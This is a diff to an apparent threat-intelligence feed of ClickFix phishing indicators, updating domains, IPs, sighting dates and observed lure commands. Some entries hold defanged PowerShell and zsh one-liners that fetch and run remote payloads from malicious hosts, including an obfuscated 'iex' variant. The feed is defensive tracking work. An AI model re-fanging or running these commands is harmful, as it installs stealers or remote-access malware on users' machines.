@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5763,
+ "count": 5762,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -17547,10 +17547,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "github.pw",
+    "j7tracker.gb.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -26053,64 +26055,6 @@
    ]
   },
   {
-   "indicator": "apkprox.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-01",
-   "last_seen": "2026-11-16",
-   "last_online": "2026-11-20",
-   "offline_since": null,
-   "url": "https://apkprox.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "188.114.96.3",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-16"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "apkprox.com",
-     "status": "online",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-16"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustresnew[.]com/danteproliv1/[id]')|iex",
-    "irm 'ncheck-brows[.]beer/[id]'|iex;",
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
-   ],
-   "connects_to": [
-    "t-trustresnew.com",
-    "ncheck-brows.beer",
-    "hagosuro.lc",
-    "t-trustrest.com",
-    "xorados.com",
-    "groverudder12.com"
-   ],
-   "lure_from": [
-    "interseq.at",
-    "jjjducodes.beer"
-   ]
-  },
-  {
    "indicator": "aplantstale.com",
    "type": "domain",
    "category": "clickfix",
@@ -26160,6 +26104,7 @@
     "t-trustrest.com",
     "t-trustresnew.com",
     "trustchecknes.com",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -30211,6 +30156,7 @@
     "t-trustrest.com",
     "t-trustresnew.com",
     "trustchecknes.com",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -41251,7 +41197,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-31",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://behavioralhealth.news/",
@@ -41269,7 +41215,7 @@
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -41277,7 +41223,7 @@
      "host": "behavioralhealth.news",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -45571,7 +45517,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-21",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://bimnservices.com/",
@@ -45589,7 +45535,7 @@
      "asn": "AS16276",
      "org": "OVH OVH SAS, FR",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     },
     {
      "ip": "2001:41d0:301::31",
@@ -45604,7 +45550,7 @@
      "host": "bimnservices.com",
      "status": "online",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -49178,7 +49124,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-12",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://blueprism-demandservices.com/",
@@ -49196,7 +49142,7 @@
      "asn": "AS14061",
      "org": "DIGITALOCEAN-ASN - DigitalOcean, LLC, US",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -49204,7 +49150,7 @@
      "host": "blueprism-demandservices.com",
      "status": "online",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -49230,7 +49176,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-12",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://blueprism-showcase.co.uk/",
@@ -49248,7 +49194,7 @@
      "asn": "AS14061",
      "org": "DIGITALOCEAN-ASN - DigitalOcean, LLC, US",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -49256,7 +49202,7 @@
      "host": "blueprism-showcase.co.uk",
      "status": "online",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -49282,7 +49228,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-12",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://blueprism-showcase.com/",
@@ -49300,7 +49246,7 @@
      "asn": "AS14061",
      "org": "DIGITALOCEAN-ASN - DigitalOcean, LLC, US",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -49308,7 +49254,7 @@
      "host": "blueprism-showcase.com",
      "status": "online",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -63481,6 +63427,7 @@
     "github.pw",
     "xorados.com",
     "trek-72.com",
+    "j7tracker.gb.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -74435,9 +74382,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -88927,11 +88876,18 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "92.113.23.123",
+   "ip": "2a02:4780:45:c348:6f37:b7c4:e917:baa1",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "DE",
    "ips": [
+    {
+     "ip": "2a02:4780:45:c348:6f37:b7c4:e917:baa1",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-19",
+     "last_seen": "2026-11-20"
+    },
     {
      "ip": "145.223.124.255",
      "asn": "AS47583",
@@ -88958,13 +88914,6 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-17",
-     "last_seen": "2026-11-20"
-    },
-    {
-     "ip": "2a02:4780:45:c348:6f37:b7c4:e917:baa1",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-19",
      "last_seen": "2026-11-20"
     },
     {
@@ -89482,7 +89431,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-21",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://dmgdelivery.com/",
@@ -89500,7 +89449,7 @@
      "asn": "AS16509",
      "org": "AMAZON-02 - Amazon.com, Inc., US",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -89508,7 +89457,7 @@
      "host": "dmgdelivery.com",
      "status": "online",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -104146,7 +104095,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.216.252",
+   "ip": "104.21.61.239",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -105847,7 +105796,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-15",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://ezmobilewebsitetools.com/",
@@ -105865,7 +105814,7 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -105873,7 +105822,7 @@
      "host": "ezmobilewebsitetools.com",
      "status": "online",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -110095,6 +110044,7 @@
     "t-trustrest.com",
     "t-trustresnew.com",
     "trustchecknes.com",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -132318,9 +132268,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -147248,9 +147200,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -147758,7 +147712,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-06",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://innorev.io/",
@@ -147776,7 +147730,7 @@
      "asn": "AS8560",
      "org": "IONOS-AS IONOS SE, DE",
      "first_seen": "2026-11-06",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -147784,7 +147738,7 @@
      "host": "innorev.io",
      "status": "online",
      "first_seen": "2026-11-06",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -149172,7 +149126,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-23",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://www.interpumpfluidsolutions.co.uk/",
@@ -149190,7 +149144,7 @@
      "asn": "AS34282",
      "org": "UKNOC-AS Team Blue Carrier Limited, GB",
      "first_seen": "2026-10-23",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -149198,7 +149152,7 @@
      "host": "www.interpumpfluidsolutions.co.uk",
      "status": "online",
      "first_seen": "2026-10-23",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -160465,10 +160419,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "github.pw",
+    "j7tracker.gb.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -161461,11 +161417,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex",
-    "echo '[encoded]' | base64 -d | zsh",
-    "(irm 'hxxps[:]//github[.]pw/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "github.pw",
+    "j7tracker.gb.net",
     "entitlementcheck.pro",
     "xorados.com",
     "trek-72.com"
@@ -163978,9 +163935,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -168737,9 +168696,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -177041,9 +177002,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -180302,9 +180265,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
+    "holodeo.net",
     "github.pw"
    ],
    "lure_from": [
@@ -180817,10 +180784,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "github.pw",
+    "j7tracker.gb.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -181992,7 +181961,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-12",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://www.manyteesshop.com/",
@@ -182010,7 +181979,7 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -182018,7 +181987,7 @@
      "host": "www.manyteesshop.com",
      "status": "online",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -183613,10 +183582,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "github.pw",
+    "j7tracker.gb.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -185153,9 +185124,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -192650,9 +192623,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -193448,6 +193423,7 @@
     "t-trustrest.com",
     "t-trustresnew.com",
     "trustchecknes.com",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -194204,9 +194180,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -201013,9 +200991,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -207710,9 +207690,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -209073,7 +209055,7 @@
    "role": "Phishing page",
    "status": "offline",
    "first_seen": "2026-11-10",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": "2026-11-20",
    "url": "https://www.opstrinity.com/",
@@ -209091,7 +209073,7 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-10",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -209099,7 +209081,7 @@
      "host": "www.opstrinity.com",
      "status": "offline",
      "first_seen": "2026-11-10",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -214988,9 +214970,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -218228,7 +218212,7 @@
    "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": "2026-11-20",
-   "url": "https://plshousing.org/wp-content/mu-plugins/vendor/wpex/godaddy-launch/includes/Dependencies/GoDadd",
+   "url": "https://plshousing.org/2026/10/08/[redacted]/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -226786,9 +226770,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
+    "holodeo.net",
     "github.pw"
    ],
    "lure_from": [
@@ -233415,7 +233403,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-01",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://richblecher.com/",
@@ -233433,7 +233421,7 @@
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-11-01",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -233441,7 +233429,7 @@
      "host": "richblecher.com",
      "status": "online",
      "first_seen": "2026-11-01",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -251391,7 +251379,7 @@
    "role": "Phishing page",
    "status": "offline",
    "first_seen": "2026-11-07",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-19",
    "offline_since": "2026-11-19",
    "url": "https://sickfat.org/",
@@ -251409,7 +251397,7 @@
      "asn": "AS31898",
      "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
      "first_seen": "2026-11-07",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -251417,7 +251405,7 @@
      "host": "sickfat.org",
      "status": "offline",
      "first_seen": "2026-11-07",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -256677,7 +256665,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-10",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://smparroudhohbeji.sch.id/",
@@ -256695,7 +256683,7 @@
      "asn": "AS131775",
      "org": "IDNIC-JALANET-AS-ID - PT. Jupiter Jala Arta, ID",
      "first_seen": "2026-11-10",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -256703,7 +256691,7 @@
      "host": "smparroudhohbeji.sch.id",
      "status": "online",
      "first_seen": "2026-11-10",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -282817,10 +282805,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "github.pw",
+    "j7tracker.gb.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -292889,7 +292879,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-12",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://uroojmovers.com/",
@@ -292907,7 +292897,7 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -292915,7 +292905,7 @@
      "host": "uroojmovers.com",
      "status": "online",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -305584,7 +305574,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-21",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
    "url": "https://willywaller.com/",
@@ -305602,7 +305592,7 @@
      "asn": "AS16276",
      "org": "OVH OVH SAS, FR",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -305610,7 +305600,7 @@
      "host": "willywaller.com",
      "status": "online",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "actor": null,
@@ -311564,10 +311554,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "github.pw",
+    "j7tracker.gb.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -314829,23 +314821,23 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "2606:4700:3033::ac43:cec4",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-11-20"
-    },
-    {
      "ip": "2606:4700:3033::ac43:cec4",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-19",
+     "last_seen": "2026-11-20"
+    },
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-10-21",
      "last_seen": "2026-11-20"
     },
     {
